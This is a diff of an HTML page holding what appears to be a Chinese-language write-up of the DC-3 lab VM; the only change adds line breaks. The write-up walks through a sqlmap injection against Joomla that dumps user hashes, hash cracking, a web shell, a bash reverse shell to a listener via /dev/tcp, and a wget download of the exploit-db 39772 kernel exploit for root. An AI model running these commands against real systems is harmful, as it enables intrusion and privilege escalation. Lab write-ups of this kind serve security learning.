@@ -7580,7 +7580,7 @@
 
 <h2 id="dc-3">DC-3</h2>
 <h2 id="ip">解决分配不到 IP 问题</h2>
-<p>没法找到他的 ip，可能是网卡配置问题
+<p>没法找到他的 ip，可能是网卡配置问题<br />
 (之前打开 .ova 文件默认联网方式是桥接，改成NAT)</p>
 <p>在开机选择的时候，摁 e 编辑一下</p>
 <p><img alt="image.png" src="../img/551828_eqg3biw806sbxcui/1585656125794-4f48f873-f0fc-49c8-b51c-49c489fa9af7-957136.png" /></p>
@@ -7599,7 +7599,7 @@
 <p>成功扫到</p>
 <p><img alt="image.png" src="../img/551828_eqg3biw806sbxcui/1585657242085-df79e617-0037-4199-ba39-5ad724a7fa87-368029.png" /></p>
 <h2 id="_1">开始打</h2>
-<p>这个靶机只有一个 flag 了，要 root 权限才能看
+<p>这个靶机只有一个 flag 了，要 root 权限才能看<br />
 nmap 扫一波</p>
 <p><img alt="image.png" src="../img/551828_eqg3biw806sbxcui/1585657401202-8de5507b-914b-4325-9a0f-03bc434d412f-871360.png" /></p>
 <p>ps.有个 whatweb 网站指纹扫描工具</p>
@@ -7610,7 +7610,7 @@ nmap 扫一波</p>
 <p><img alt="image.png" src="../img/551828_eqg3biw806sbxcui/1585658203461-db0ecb78-00f5-4806-9121-92f9f7c60e15-275129.png" /></p>
 <p>sqlmap 跑一下</p>
 <p><img alt="image.png" src="../img/551828_eqg3biw806sbxcui/1585658265564-b8b6cbe5-eb52-4441-9a8a-c082aa130757-843906.png" /></p>
-<p>最终的 sqlmap 命令
+<p>最终的 sqlmap 命令<br />
 <code>sqlmap -u "http://192.168.149.157/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D "joomladb" -T "#__users" -C name,password --dump -p list[fullordering]</code></p>
 <p><img alt="image.png" src="../img/551828_eqg3biw806sbxcui/1585659287487-5299b022-f778-4166-b571-c331f988ff6e-413931.png" /></p>
 <p>把 password 的 hash 保存下来，使用 john 爆破，得到密码：snoopy</p>
@@ -7625,22 +7625,22 @@ nmap 扫一波</p>
 <p>蚁剑连接一下</p>
 <p><img alt="image.png" src="../img/551828_eqg3biw806sbxcui/1585661643260-8ba61190-02d5-406c-a809-35ff54012fb0-339268.png" /></p>
 <p>本地监听一个端口：nc -lvp 8888</p>
-<p>终端里面执行：
+<p>终端里面执行：<br />
 <code>bash -c 'bash -i &amp;&gt;/dev/tcp/192.168.149.141/8888 0&gt;&amp;1'</code></p>
 <p><img alt="image.png" src="../img/551828_eqg3biw806sbxcui/1585661958257-cb674f63-4ed2-4f9c-86ca-f960a03c1d22-430410.png" /></p>
 <p>lsb_release -a 可以看到是 ubuntu 16.04</p>
 <p><img alt="image.png" src="../img/551828_eqg3biw806sbxcui/1585662230528-793a2f30-056e-4d5a-83fb-22f015948ca7-510251.png" /></p>
 <p>searchsploit ubuntu 16.04，大佬们说这个可以用</p>
 <p><img alt="image.png" src="../img/551828_eqg3biw806sbxcui/1585662366098-2c12f8d8-ec34-4277-b68d-09a86db97632-401260.png" /></p>
-<p>cat 一下，让去下这个东西：
+<p>cat 一下，让去下这个东西：<br />
 wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip，就可以的呀，不知道为啥参考的文章评论区说这个 exp 没了</p>
 <p><img alt="image.png" src="../img/551828_eqg3biw806sbxcui/1585662883528-c3a36b5a-aba5-441b-b614-a39759a2fc85-415946.png" /></p>
-<p>unzip 39772.zip  #解压29772.zip文件
-cd 39772
-tar -xvf exploit.tar  #解压exploit提权脚本tar包
+<p>unzip 39772.zip  #解压29772.zip文件<br />
+cd 39772<br />
+tar -xvf exploit.tar  #解压exploit提权脚本tar包<br />
 cd ebpf_mapfd_doubleput_exploit</p>
 <p><img alt="image.png" src="../img/551828_eqg3biw806sbxcui/1585662905639-c6239b7c-d564-46ab-83b9-4a13f13a3071-230353.png" /></p>
-<p>./compile.sh   #执行脚本，编译文件
+<p>./compile.sh   #执行脚本，编译文件<br />
 ./doubleput  #执行提权文件</p>
 <p><img alt="image.png" src="../img/551828_eqg3biw806sbxcui/1585663114257-8b1dc091-1134-47ab-b0b8-e48c8934ef7b-123134.png" /></p>
 <p>在 /root 目录下存着 flag</p>
